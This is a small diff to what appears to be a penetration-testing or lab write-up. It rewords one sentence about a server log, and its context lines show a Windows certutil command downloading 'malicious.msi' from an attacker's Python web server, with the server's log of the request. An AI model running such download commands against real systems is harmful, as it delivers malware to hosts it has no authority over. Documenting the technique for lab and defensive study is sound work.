@@ -174,7 +174,7 @@ C:\Windows\system32> certutil -urlcache -f http://192.168.151.76:8000/malicious.
 CertUtil: -URLCache command completed successfully.
 ```
 
-The Python server confirmed the download happened twice (that's normal `certutil` sometimes makes multiple requests):
+The Python server confirmed the download:
 
 ```
 10.49.161.116 - - [28/Jul/2026 21:23:16] "GET /malicious.msi HTTP/1.1" 200 -
